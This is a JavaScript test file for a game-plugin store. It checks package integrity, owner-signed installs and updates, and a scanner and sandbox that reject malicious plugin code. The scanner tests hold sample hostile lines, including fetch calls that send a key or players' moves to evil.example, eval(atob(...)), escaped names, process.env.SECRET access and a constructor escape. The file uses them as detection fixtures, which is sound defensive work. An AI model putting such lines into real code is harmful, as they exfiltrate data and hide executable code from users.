// THE PLUGIN STORE (kanban #276 step 5, the owner 2026-10-09: "See what other nodes host. Install it. Always scan for malicious
// code before install"; 2026-10-10: "games can be downloaded from other nodes"): a seat hands a hosted game over as a package;
// another seat's owner installs it - its manifest, donation set and every file checked byte for byte, its code scanned -
// and it runs from that seat's next start. A doctored file, code that reaches out, or an install not signed by the owner
// is refused.
import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdtempSync, existsSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { schnorr } from '@noble/curves/secp256k1.js';
import { openStore } from '../src/store.js';
import { serve } from '../src/server.js';
import { packageOf, verifyPackage, scanSource, loadInstalled } from '../src/plugin-package.js';
import { verifyEd25519 } from '../src/ed25519.js';
import { ownerSecretFromSeed, signOwnerRequest } from '../src/owner.js';
import { ROCK_PAPER_SCISSORS } from '../../rock-paper-scissors/plugin/rock-paper-scissors.js';
import { testHeadToHeadGame, testDonationSet } from './plugins/sign.js';
import { toHex } from '../../arena-protocol/src/hash.js';
import { encodeManifest } from '../../arena-protocol/src/manifest.js';

const sha = (b) => createHash('sha256').update(b).digest('hex');
const RPS_ID = toHex(ROCK_PAPER_SCISSORS.gameId);

test('a hosted game as a package: Rock Paper Scissors stands, its files are its manifest\'s, its code passes the scan', () => {
  const pkg = packageOf(ROCK_PAPER_SCISSORS);
  assert.equal(pkg.cores.length, 1);
  assert.equal(pkg.clients.length, 1);
  const v = verifyPackage(pkg, { verify: verifyEd25519, want: RPS_ID });
  assert.equal(v.ok, true, v.why);
  assert.equal(v.name, 'rock-paper-scissors');
});

test('a doctored file, a client the manifest does not name, or another game\'s id is refused by name', () => {
  const pkg = packageOf(ROCK_PAPER_SCISSORS);
  const src = Buffer.from(pkg.cores[0].source, 'base64').toString('utf8').replace("'WIN'", "'LOSS'");
  const doctored = { ...pkg, cores: [{ ...pkg.cores[0], source: Buffer.from(src).toString('base64') }] };
  assert.match(verifyPackage(doctored, { verify: verifyEd25519 }).why, /its source is not the file its manifest names/);
  const otherClient = { ...pkg, clients: [{ hash: sha(Buffer.from('<html>other</html>')), body: Buffer.from('<html>other</html>').toString('base64') }] };
  assert.match(verifyPackage(otherClient, { verify: verifyEd25519 }).why, /not a client its manifest names/);
  assert.match(verifyPackage(pkg, { verify: verifyEd25519, want: 'ab'.repeat(32) }).why, /not abababab/);
});

test('the scan: code that loads modules, evaluates, reaches the network, the file system or the global scope is refused', () => {
  assert.deepEqual(scanSource('export const DECIDE = { decide(m) { return {}; } };'), []);
  const rules = (s) => scanSource(s).map((f) => f.rule);
  assert.deepEqual(rules("import fs from 'node:fs';"), ['loads another module']);
  assert.deepEqual(rules('const x = await import("http");'), ['loads another module']);
  assert.deepEqual(rules('eval(atob(x))'), ['evaluates code', 'hides its text']);
  assert.deepEqual(rules('const k = "\\x66\\x65\\x74\\x63\\x68";'), ['hides its text'], 'an escaped name');
  assert.deepEqual(rules('fetch("https://evil.example/" + key)'), ['reaches the network']);
  assert.deepEqual(rules('process.env.SECRET'), ['reaches the file system or the process']);
  assert.deepEqual(rules('globalThis.x = 1'), ['reaches the global scope']);
  assert.deepEqual(rules('(()=>{}).constructor.constructor("return this")()'), ['reaches its own constructor']);
  // a game signed by its developer whose decide adapter reaches the network: its hashes match, the scan still refuses it
  const bad = 'export const DECIDE = { name: "bad", decide(moves) { fetch("https://evil.example/?m=" + JSON.stringify(moves)); return {}; } };';
  const core = { name: 'bad', hash: sha(Buffer.from(bad)), adapter: null, configs: new Map([['11'.repeat(32), {}]]) };
  const game = testHeadToHeadGame({ name: 'bad-game', core });
  const pkg = { format: 'arena-plugin/v1', name: 'bad-game', manifest: toHex(encodeManifest(game.manifest)), donationSet: testDonationSet('bad-game').map((r) => ({ recipientPk: toHex(r.recipientPk), shareBps: r.shareBps, label: r.label })),
    cores: [{ hash: core.hash, name: 'bad', configs: ['11'.repeat(32)], source: Buffer.from(bad).toString('base64') }], clients: [] };
  const v = verifyPackage(pkg, { verify: verifyEd25519 });
  assert.equal(v.ok, false);
  assert.match(v.why, /the scan refuses it: reaches the network \(line 1\)/);
});

test('install from another seat: signed by the owner, checked, kept; loaded at the next start, its adapter plays', async () => {
  const a = await serve(openStore(), { plugins: [ROCK_PAPER_SCISSORS], port: 0 });
  const dir = mkdtempSync(join(tmpdir(), 'arena-plugins-'));
  const seed = new Uint8Array(32).fill(7), secret = ownerSecretFromSeed(seed);
  const rec = { pubkey: toHex(schnorr.getPublicKey(secret)), claimedAtMs: 1 };
  const b = await serve(openStore(), { plugins: [], port: 0, pluginsDir: dir, owner: { store: { read: () => rec, write: () => {}, writeCode: () => {} } } });
  try {
    const A = `http://127.0.0.1:${a.port}`, B = `http://127.0.0.1:${b.port}`;
    const node = (await (await fetch(`${B}/owner`)).json()).node;
    const req = (args, s = secret) => signOwnerRequest({ node, action: 'install', args, secret: s, sign: (m, k) => schnorr.sign(m, k), pubkeyOf: (k) => schnorr.getPublicKey(k) });
    const post = (body) => fetch(`${B}/owner/plugins/install`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
    assert.equal((await post(req({ game: RPS_ID, from: A }, ownerSecretFromSeed(new Uint8Array(32).fill(9))))).status, 403, 'not the owner');
    assert.equal((await fetch(`${A}/plugin?game=${'ab'.repeat(32)}`)).status, 404);
    const r = await post(req({ game: RPS_ID, from: A }));
    const j = await r.json();
    assert.equal(r.status, 200, j.why);
    assert.equal(j.name, 'rock-paper-scissors');
    assert.ok(existsSync(join(dir, RPS_ID, 'package.json')));
    const list = await (await fetch(`${B}/owner/plugins`)).json();
    assert.deepEqual(list.installed.map((x) => [x.id, x.running]), [[RPS_ID, true]], 'installed and running at once - no restart');
    // the next start: loaded, checked again, and its decide adapter plays rock against scissors
    const got = await loadInstalled(dir, { verify: verifyEd25519 });
    assert.deepEqual(got.refused, []);
    assert.equal(toHex(got.registrations[0].gameId), RPS_ID);
    const [core] = [...got.registrations[0].cores.values()];
    assert.deepEqual(core.adapter.decide([{ key: 'a', move: 0 }, { key: 'b', move: 2 }]), { a: 'WIN', b: 'LOSS' });
    assert.deepEqual(readdirSync(join(dir, RPS_ID)).sort().map((f) => f.split('-')[0]), ['client', 'core', 'package.json']);
  } finally { await a.close(); await b.close(); }
});

// ---- the App Store slice (the owner 2026-10-10: in the browser, no restart, updates as a setting, malicious checks) ----
import { writeFileSync, mkdirSync } from 'node:fs';
import { pathToFileURL } from 'node:url';
import { signManifest } from '../../arena-donor/src/manifest-sign.js';
import { testDevKey } from './plugins/sign.js';
import { RESULT_TYPE, PAYOUT_RULE, NO_PARENT, gameIdOf } from '../../arena-protocol/src/manifest.js';
import { donationSetId } from '../../arena-protocol/src/donation.js';
import { checkPackage, checkUpdate } from '../src/plugin-check.js';
import { trialRun } from '../src/plugin-trial.js';

// a head-to-head game "tic" in two versions by one developer, and an impostor v2 by another; decide adapters on disk
const srcDir = mkdtempSync(join(tmpdir(), 'arena-tic-'));
const ticSource = (tag) => `export const DECIDE = { name: 'tic ${tag}', decide(moves) { const out = {}; const best = Math.max(...moves.map((m) => m.move));
  const winners = moves.filter((m) => m.move === best).length; for (const m of moves) out[m.key] = winners === moves.length ? 'DRAW' : m.move === best ? 'WIN' : 'LOSS'; return out; } };\n`;
async function ticGame({ version, parent = NO_PARENT, dev = 'tic dev', tag = 'v' + version }) {
  const src = ticSource(tag), file = join(srcDir, `decide-${tag}.mjs`);
  writeFileSync(file, src);
  const hash = sha(Buffer.from(src)), cfg = '22'.repeat(32);
  const set = testDonationSet('tic');
  const key = testDevKey(dev);
  const manifest = signManifest({ gameName: 'tic', gameDevPubkey: key.pubkey, version, parentManifestId: parent, resultType: RESULT_TYPE.HEAD_TO_HEAD,
    cores: [{ hash: Buffer.from(hash, 'hex'), configs: [Buffer.from(cfg, 'hex')] }], runTicksMax: 0, roundPeriodMs: 0n, payoutRule: PAYOUT_RULE.RANK_CURVE,
    rankNumerator: 3, rankDenominator: 4, minScore: 2, clients: [], gameDonationSetId: donationSetId(set), players: 2, moveCount: 3, revealWindowMs: 60000n }, key);
  const adapter = (await import(pathToFileURL(file).href)).DECIDE;
  return { name: 'tic', manifest, gameId: gameIdOf(manifest), donationSet: set, clientUrls: [],
    cores: new Map([[hash, { name: `tic ${tag}`, hash, url: pathToFileURL(file).href, adapter, configs: new Map([[cfg, {}]]) }]]) };
}

test('the page\'s report lists every check, passed or not; the seat adds the trial run', async () => {
  const pkg = packageOf(ROCK_PAPER_SCISSORS);
  const r = checkPackage(pkg, { verify: verifyEd25519 });
  assert.equal(r.ok, true);
  assert.deepEqual(r.checks.map((c) => c.ok), r.checks.map(() => true));
  assert.ok(r.checks.some((c) => /signed by its developer/.test(c.check)));
  const seat = verifyPackage(pkg, { verify: verifyEd25519 });
  assert.match(seat.checks.at(-1).check, /runs in the sandbox/);
  assert.match(seat.checks.at(-1).detail, /9 move combinations/);
  // the trial run catches what the scan cannot see
  const m = ROCK_PAPER_SCISSORS.manifest;
  assert.equal(trialRun('export const DECIDE = { decide(m) { for (let i = 0; ; i++) {} } };', m).ok, false, 'an endless loop');
  assert.match(trialRun('export const DECIDE = { decide(m) { return Object.fromEntries(m.map((x) => [x.key, Math.random() < 0.5 ? "WIN" : "LOSS"])); } };', m).why, /differently twice/);
  assert.match(trialRun('export const DECIDE = { decide(m) { return { cheat: "WIN" }; } };', m).why, /each player exactly once/);
  assert.match(trialRun('export const DECIDE = { decide(m) { throw new Error("boom"); } };', m).why, /boom/);
});

test('an update is the same developer\'s next version of the installed game', async () => {
  const v1 = await ticGame({ version: 1 });
  const v2 = await ticGame({ version: 2, parent: v1.gameId });
  const other = await ticGame({ version: 2, parent: v1.gameId, dev: 'someone else', tag: 'x2' });
  const info = (g) => ({ gameId: toHex(g.gameId), devKey: toHex(g.manifest.gameDevPubkey), version: g.manifest.version, parent: toHex(g.manifest.parentManifestId) });
  assert.equal(checkUpdate(info(v1), info(v2)).ok, true);
  assert.match(checkUpdate(info(v1), info(other)).why, /signed by another developer/);
  assert.match(checkUpdate(info(v2), info(v1)).why, /names .* as its parent|not newer/);
});

test('install, update and remove from the owner, each running at once (no restart); automatic updates as a setting', async () => {
  const v1 = await ticGame({ version: 1, tag: 'a1' });
  const v2 = await ticGame({ version: 2, parent: v1.gameId, tag: 'a2' });
  const v3 = await ticGame({ version: 3, parent: v2.gameId, tag: 'a3' });
  const a = await serve(openStore(), { plugins: [v1, v2], port: 0 });
  // C hosts v3 with its earlier versions' manifests (an installed update's chain): a version stands only on its parent
  const c = await serve(openStore(), { plugins: [{ ...v3, ancestors: [v1.manifest, v2.manifest] }], port: 0 });
  const dir = mkdtempSync(join(tmpdir(), 'arena-plugins-'));
  const secret = ownerSecretFromSeed(new Uint8Array(32).fill(7));
  const rec = { pubkey: toHex(schnorr.getPublicKey(secret)), claimedAtMs: 1 };
  process.env.ARENA_AUTO_UPDATE_MS = '300';   // the sweep, fast for the test (10 minutes on a seat)
  const b = await serve(openStore(), { plugins: [], port: 0, pluginsDir: dir, owner: { store: { read: () => rec, write: (o) => Object.assign(rec, o), writeCode: () => {} } } });
  delete process.env.ARENA_AUTO_UPDATE_MS;
  try {
    const A = `http://127.0.0.1:${a.port}`, B = `http://127.0.0.1:${b.port}`, C = `http://127.0.0.1:${c.port}`;
    const node = (await (await fetch(`${B}/owner`)).json()).node;
    const req = (action, args) => signOwnerRequest({ node, action, args, secret, sign: (m, k) => schnorr.sign(m, k), pubkeyOf: (k) => schnorr.getPublicKey(k) });
    const post = async (path, body) => { const r = await fetch(B + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }); return [r.status, await r.json()]; };
    const games = async () => (await (await fetch(`${B}/games`)).json()).games.map((g) => g.id).sort();
    const id1 = toHex(v1.gameId), id2 = toHex(v2.gameId), id3 = toHex(v3.gameId);
    let [st, j] = await post('/owner/plugins/install', req('install', { game: id1, from: A }));
    assert.equal(st, 200, j.why);
    assert.equal(j.running, true);
    assert.deepEqual(await games(), [id1], 'running at once: the seat lists it without a restart');
    [st, j] = await post('/owner/plugins/update', req('update', { game: id2, from: A, replaces: id1 }));
    assert.equal(st, 200, j.why);
    assert.deepEqual(await games(), [id1, id2].sort(), 'the new version runs; the old one stays for the rounds it holds');
    const list = await (await fetch(`${B}/owner/plugins`)).json();
    assert.equal(list.hosted.find((g) => g.id === id1).supersededBy, id2);
    // an update that skips a version, or comes from another developer, is refused
    [st, j] = await post('/owner/plugins/update', req('update', { game: id3, from: C, replaces: id1 }));
    assert.equal(st, 422);
    assert.match(j.why, /parent/);
    // remove the old version: no round of it is held here
    [st, j] = await post('/owner/plugins/remove', req('remove', { game: id1 }));
    assert.equal(st, 200, j.why);
    assert.deepEqual(await games(), [id2]);
    // AUTOMATIC UPDATES: the owner turns them on with C as a source; the next sweep takes v3 over v2
    [st, j] = await post('/owner/settings', req('settings', { autoUpdate: true, sources: [C] }));
    assert.equal(st, 200);
    assert.deepEqual(j.settings, { autoUpdate: true, sources: [C] });
    let seen = [];
    for (let i = 0; i < 40 && !seen.includes(id3); i++) { await new Promise((r) => setTimeout(r, 100)); seen = await games(); }
    assert.deepEqual(seen, [id2, id3].sort(), 'v3 taken by itself, running next to v2 (which keeps the rounds it holds)');
    assert.equal((await (await fetch(`${B}/owner/plugins`)).json()).hosted.find((g) => g.id === id2).supersededBy, id3);
  } finally { await a.close(); await b.close(); await c.close(); }
});
